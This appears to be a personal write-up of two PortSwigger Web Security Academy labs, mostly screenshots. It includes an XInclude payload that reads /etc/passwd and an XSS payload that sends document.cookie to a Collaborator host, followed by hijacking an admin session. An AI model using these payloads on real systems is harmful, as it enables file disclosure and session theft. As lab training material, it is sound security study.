# burp-essential-skills
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/
<br><br>

<h3>Lab: Discovering vulnerabilities quickly with targeted scanning</h3>

<img width="1171" height="739" alt="image" src="https://github.com/user-attachments/assets/aae630f0-4e38-4b0b-9231-29e2ccffa884" />

<br><br>

<img width="745" height="515" alt="image" src="https://github.com/user-attachments/assets/b75cdfe9-1737-4c4f-aed4-dc75d1ee80ec" />

<br><br>

productId parameter is vulnerable, Url encoded payload <br>
<img width="524" height="538" alt="image" src="https://github.com/user-attachments/assets/cff3e345-aeb1-49ec-9dcd-e0787ecf53c7" />

<br><br>

repeater

<br><br>

origin payload: 
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>```

win payload:
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>```
<br><br>

<img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />

<br><br><br><br><br><br><br><br><br><br>

<h3>Lab: Scanning non-standard data structures</h3>
<br><br>
To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.
<br><br>
server said: browser, set this as a session cookie of user.
if we want to test sth, we want to test sth that is predictable.
cookies interacts with the database every time the request is send.
<br><br>
<img width="837" height="678" alt="image" src="https://github.com/user-attachments/assets/8821726f-965e-4626-aaab-fcce57d75bd8" />

<br><br>
& audit selected items. <br><br>
<img width="555" height="464" alt="image" src="https://github.com/user-attachments/assets/12d547b0-2b8a-4cab-8406-6810891f865a" />

<img width="766" height="680" alt="image" src="https://github.com/user-attachments/assets/6826ebf0-2673-4342-8115-5116637adfed" />

<br><br>
origin payload: ``` '"><svg/onload=fetch`//hcx56jcq7hqqt5jhqarhnd8ab1hw5mtej2asxil7\.oastify.com`> ```<br><br>
edit (copy own collab address): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/document.cookie`)> ```<br><br>
original cookie was url encoded so document cookie part also must be<br><br>
win payload (insert new colab payload): ``` '"><svg/onload=fetch(`//cm24m3xutms5b3onvfhzeizs4jaay2mr.oastify.com/${encodeURIComponent(document.cookie)}`)>```<br><br>
<br>
<img width="833" height="574" alt="image" src="https://github.com/user-attachments/assets/5415eedf-f95a-40dd-8cd1-f7a6bc76c7bb" />

winer <br>
<img width="1086" height="709" alt="image" src="https://github.com/user-attachments/assets/80f8f0f0-2885-4369-83a1-ecbdb537ad68" />
<img width="998" height="407" alt="image" src="https://github.com/user-attachments/assets/9d211e67-a926-468d-b303-e30827ea18a9" />

<br>
in browser: delete cookies except for path / and paste admin (>admin panel>delete carlos)



